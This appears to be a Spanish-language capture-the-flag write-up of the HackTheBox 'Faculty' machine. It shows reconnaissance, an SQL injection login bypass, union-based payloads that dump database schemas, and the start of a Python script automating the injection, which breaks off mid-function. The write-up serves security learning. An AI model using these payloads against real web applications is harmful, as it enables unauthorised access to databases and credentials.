<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Faculty" /><meta property="og:locale" content="en" /><meta name="description" content="Overview:" /><meta property="og:description" content="Overview:" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBFaculty/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBFaculty/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-04T17:15:18-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Faculty" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-04T17:15:18-05:00","datePublished":"2022-08-04T17:15:18-05:00","description":"Overview:","headline":"Hackthebox Writeup Faculty","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBFaculty/"},"url":"https://e1p0tr0.github.io/posts/HTBFaculty/"}</script><title>Hackthebox Writeup Faculty | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Faculty</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Faculty</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guill√©n</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1659651318" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-04 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4968 words"> <em>27 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview:</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Database enumeration and bypass login page by <strong>SQL Inyection</strong><li>System users, system files, ssh credentials by <strong>Server Side XSS (Dynamic PDF)</strong><li>Meta plugin <em>meta-git</em> <strong>Remote code execution</strong> (foothold)<li>Privileged process debugging with <strong>GDB system function call</strong> (privilege escalation)</ul><hr /><p><img data-src="/assets/img/htb/writeups/faculty/logo.png" alt="FacultyLogo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.169<td style="text-align: center">02 Jul 2022<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexi√≥n con la m√°quina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.169
PING 10.10.11.169 <span class="o">(</span>10.10.11.169<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.169: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>107 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.169 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 106.595/106.595/106.595/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicaci√≥n de par√°metros:</p><p>-c &lt;count&gt; : N√∫mero de paquetes ICMP que deseamos enviar a la m√°quina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 17:26 -05
Nmap scan report for 10.10.11.169
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
	      \___________________ Secure Shel Protocol
80/tcp open  http
	      \___________________ Hypertext Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicaci√≥n de par√°metros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexi√≥n), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como m√≠nimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuesti√≥n (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora realizamos un escaneo a profundidad de los puertos <strong>22(SSH) - 80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -p22,80 -sCV 10.10.11.160 -oN openPortsTCP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 17:32 -05
Nmap scan report for 10.10.11.160
Host is up (0.11s latency).

PORT   STATE  SERVICE VERSION
</span><span class="gp">22/tcp open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
80/tcp closed http
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicaci√≥n de par√°metros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusi√≥n de par√°metros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detecci√≥n de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Al empezar por el servicio web <strong>80(HTTP)</strong> y buscar que tecnolog√≠as usa, nos damos cuenta que existe una redirecci√≥n a <code class="language-plaintext highlighter-rouge">faculty.htb</code>:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">nc</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nc 10.10.11.169 80 -v
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.11.169:80.
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 Aug 2022 22:46:25 GMT
Content-Type: text/html
Content-Length: 154
Connection: close
Location: http://faculty.htb &lt;--------- Redirection

</span><span class="gp">&lt;html&gt;</span><span class="w">
</span><span class="gp">&lt;head&gt;</span>&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt;
<span class="gp">&lt;body&gt;</span><span class="w">
</span><span class="gp">&lt;center&gt;</span>&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt;
<span class="gp">&lt;hr&gt;</span>&lt;center&gt;nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/center&gt;
<span class="gp">&lt;/body&gt;</span><span class="w">
</span><span class="gp">&lt;/html&gt;</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>Con <code class="language-plaintext highlighter-rouge">curl</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">‚ùØ curl -I http://10.10.11.169
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 Aug 2022 22:43:11 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://faculty.htb &lt;------- Redirection
</span></pre></table></code></div></div><blockquote><p>Con <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">‚ùØ whatweb http://10.10.11.169
http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://faculty.htb - no address for faculty.htb &lt;------- Redirection
</span></pre></table></code></div></div><p>Entonces confirmamos que se aplica <strong>Virtual Hosting</strong> y por ello lo agregamos a nuestro archivo, encargado de la resoluci√≥n r√°pida de direcciones IP y nombres de dominio, <em>/etc/hosts</em> : <code class="language-plaintext highlighter-rouge">echo "10.10.11.169 faculty.htb" &gt;&gt; /etc/hosts</code></p><p>Ahora si procedemos a buscar las tecnolog√≠as que corren por detr√°s usando <code class="language-plaintext highlighter-rouge">whatweb</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">‚ùØ whatweb http://10.10.11.169
http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]
http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Si quieres una opci√≥n gr√°fica puedes usar en tu navegador la extensi√≥n <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> y ver las tecnolog√≠as</p></div></blockquote><p>Observamos que tiene como servidor web una version estable de <code class="language-plaintext highlighter-rouge">Nginx</code> (version hasta la fecha de hoy: 1.19), como sistema operativo un <code class="language-plaintext highlighter-rouge">Ubuntu</code>, entre otros. Lo mas interesante es que hay otra redirecci√≥n a la ruta <em>login.php</em>:</p><blockquote><p>Ingresando con <code class="language-plaintext highlighter-rouge">Firefox</code>:</p></blockquote><p><img data-src="/assets/img/htb/writeups/faculty/http_web.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Nos encontramos en una especie de sistema virtual de una facultad y nos pide ingresar nuestro <strong>N√∫mero de Identificaci√≥n</strong>, al no tener uno empezamos probando una <strong>inyecci√≥n b√°sica de SQL</strong> <code class="language-plaintext highlighter-rouge">' or 1=1-- -</code> y logramos entrar como el usuario <code class="language-plaintext highlighter-rouge">Smith Jhon C</code> pero sin poder hacer mucho</p><p>Para observar de una mejor manera la respuesta a este panel de identificaci√≥n y la inyecci√≥n SQL, procedemos a interceptar la petici√≥n con <code class="language-plaintext highlighter-rouge">burpsuite</code></p><p>Ingresando como input una comilla simple <code class="language-plaintext highlighter-rouge">'</code> logramos generar un error y la ruta absoluta de un archivo <strong>PHP</strong>:</p><p><img data-src="/assets/img/htb/writeups/faculty/burp_login.png" alt="BURPLogin" class="shadow" data-proofer-ignore></p><p>Ahora que obtenemos una respuesta de error podemos listar las bases de datos que existan y sus respectivas tablas y columnas:</p><blockquote><p>Primero tenemos que hallar el n√∫mero de columnas de la tabla actual en la que se est√°n seleccionando los datos</p></blockquote><p><img data-src="/assets/img/htb/writeups/faculty/sqli_order_by.png" alt="SQLI" class="shadow" data-proofer-ignore></p><p>La palabra clave o comando <code class="language-plaintext highlighter-rouge">order by</code> ordena el conjunto de resultados de la consulta (asc. o desc.) y nos sirve para hallar el n√∫mero de columnas. Veamos un ejemplo:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>MariaDB [test_db]&gt; select * from Accounts;
+----------+----------+-------------------+
| Username | Password | Email             |
+----------+----------+-------------------+
| admin    | HxZsO9AR | admin@site.com    |
| staff    | ihKdNTU4 | staff@site.com    |
| user     | Iwsi7Ks8 | usr@othersite.com |
+----------+----------+-------------------+
MariaDB [test_db]&gt; select * from Accounts where Username = '' order by 1;
Empty set (0.000 sec)

MariaDB [test_db]&gt; select * from Accounts where Username = '' order by 2;
Empty set (0.001 sec)

MariaDB [test_db]&gt; select * from Accounts where Username = '' order by 3;
Empty set (0.001 sec)

MariaDB [test_db]&gt; select * from Accounts where Username = '' order by 4;
ERROR 1054 (42S22): Unknown column '4' in 'order clause' &lt;------------------ Number of columns = 3 (4 - 1)
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Tambien puede usarse la palabra clave <code class="language-plaintext highlighter-rouge">group by</code>, ambos funcionan igual para este prop√≥sito</p></div></blockquote><blockquote><p>Ahora tenemos que hacer una selecci√≥n con el n√∫mero de columnas de la tabla para poder usar cualquiera de sus campos</p></blockquote><p><img data-src="/assets/img/htb/writeups/faculty/sqli_union_select.png" alt="SQLI" class="shadow" data-proofer-ignore></p><p>Para ello usamos la palabra clave <code class="language-plaintext highlighter-rouge">union</code> que nos permite unir varias selecciones de distintas tablas en una sola. Veamos el ejemplo:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>MariaDB [test_db]&gt; select * from Accounts where Username = '' union select 1,2,3;
+----------+----------+-------+
| Username | Password | Email |
+----------+----------+-------+
| 1        | 2        | 3     |
+----------+----------+-------+
</pre></table></code></div></div><blockquote><p>Ahora que ya tenemos acceso a los campos, usamos la funci√≥n <code class="language-plaintext highlighter-rouge">group_concat()</code> para poder extraer los nombres de bases de datos, columnas, etc</p></blockquote><p><img data-src="/assets/img/htb/writeups/faculty/sqli_group_concat.png" alt="SQLI" class="shadow" data-proofer-ignore></p><p>La funci√≥n <code class="language-plaintext highlighter-rouge">group_concat()</code> nos ayuda a concatenar datos de m√∫ltiples filas en un solo campo. Veamos un ejemplo:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>MariaDB [test_db]&gt; select * from Accounts where Username = '' union select 1,2,group_concat(0x7c, user(), 0x7c, database(), 0x7c);
+----------+----------+--------------------------+
| Username | Password | Email                    |
+----------+----------+--------------------------+
| 1        | 2        | |root@localhost|test_db| |
+----------+----------+--------------------------+
</pre></table></code></div></div><p>Finalmente ahora podemos extraer diversa informaci√≥n como:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">--Database names
' union select 1,2,group_concat(0x7c,schema_name,0x7c) from information_schema.schemata

--Tables of a database
' union select 1,2,3,group_concat(0x7c,table_name,0x7C) from information_schema.tables where table_schema=[database]

--Column names
' union select 1,2,3,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name=[table name]
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Esta y m√°s informaci√≥n lo encuentras en <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based">Hacktricks</a></p></div></blockquote><p>El √∫nico problema era que teniamos que ir probando cada query en la p√°gina <em>login.php</em> y es tedioso, por ello hice un script en <code class="language-plaintext highlighter-rouge">python</code> para automatizar gran proceso:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">argparse</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">base64</span>

<span class="c1"># debugging
</span><span class="kn">import</span> <span class="nn">pdb</span>

<span class="c1"># ctrl+C
</span>
<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Interruption"</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># global variables
</span>
<span class="n">target_url</span> <span class="o">=</span> <span class="s">'http://faculty.htb'</span>

<span class="c1"># arguments
</span>
<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'SQL Inyection'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--database'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Select database'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--table'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Select table'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--column'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Select column'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-q'</span><span class="p">,</span> <span class="s">'--query'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'One word query (g.e version())'</span><span class="p">)</span>

<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="c1"># query modes
</span>
<span class="k">def</span> <span class="nf">get_databases</span><span class="p">():</span>
    <span class="k">return</span> <span class="s">"""' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -"""</span>

<span class="k">def</span> <span class="nf">get_tables</span><span class="p">(</span><span class="n">database</span><span class="p">):</span>
